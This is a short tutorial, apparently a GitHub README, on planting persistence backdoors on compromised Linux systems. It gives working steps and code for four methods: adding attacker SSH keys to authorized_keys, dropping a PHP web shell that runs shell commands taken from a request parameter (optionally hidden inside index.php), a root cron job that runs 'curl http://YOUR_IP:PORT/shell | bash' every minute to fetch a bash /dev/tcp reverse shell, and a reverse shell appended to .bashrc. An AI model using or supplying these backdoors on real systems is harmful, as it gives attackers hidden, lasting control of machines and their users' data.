# Linux Backd00rs!
## @Author : M3tr1c_r00t

### 1). We can use SSH-keys...
I know your gonna say that ssh-keys aren't backdoors.
But there is one thing you should note, you can login into ssh with a pty spawn, therefore, you can be a little bit more sneaky.
#### generating ssh-keys
```
ssh-keygen -f <FILE_NAME>
```
-f - saves the ssh -key in the current directory in the name that you will assign it.
After running the command, you are going to be asked to enter a password...
If you dont want to encrypt your ssh-keys, just press enter twice.

This is going to generate 2 files, the ssh private key and the public key.
You are going to be needed to add the ssh-public key into the user's .ssh directory.
If in that directory there is a file, "authorized_keys", you can copy the contents of your public key into that file.
After that, we can login to the system using ssh.
```
ssh User@IP -i PRIVATE_SSH_KEY
```
To login without a pty shell;
```
ssh User@IP -i PRIVATE_SSH_KEY -T
```
If the directory .ssh is not present, you can always create it.
NB./ This may not work if your user isnt permitted to use ssh -keys.

Plus, if you get an RSA private key, before using it, remember to give it the appropriate read permissions.
```
chmod 400 PRIVATE_RSA_KEY
```
But it isnt a must to do this on the files generated using ssh-keygen as it does this automatically.

### 2). PHP Backdoors...
We can add this in the web root directory which is usually located at /var/www/html
With that info, you can add any php malicious code in that directory and save it as a .php file...
Example code;
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```
You can also use the php reverse shell script.
You can also add the malicious code in between the files such as the index.php file which is a lot sneaky.

### 3). Cron Jobs...
If you want to view the cron job;
```
cat /etc/crontab
```
This represents all the tasks that are scheduled to run at some time on your machine.

well, we can add a cronjob to be sending us a reverse shell every minute...
```
* *     * * *   root    curl http://YOUR_IP:PORT/shell | bash
```
This is going to run this script after every minute,hour,day,etc.
We can add this to be into the shell file contents...
```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
```
For this to work, we need to have set up our http.server so that the script will be able to get the file.
We also need to have set up our listener.

NB: You need to be the root user so as to be able to edit the /etc/crontab file.

### 4). [.bashrc] Backdoors....
If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.
Well, we can add this payload into the .bashrc file;
```
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```
This is going to send us a reverse shell anytime the user logs into the machine.









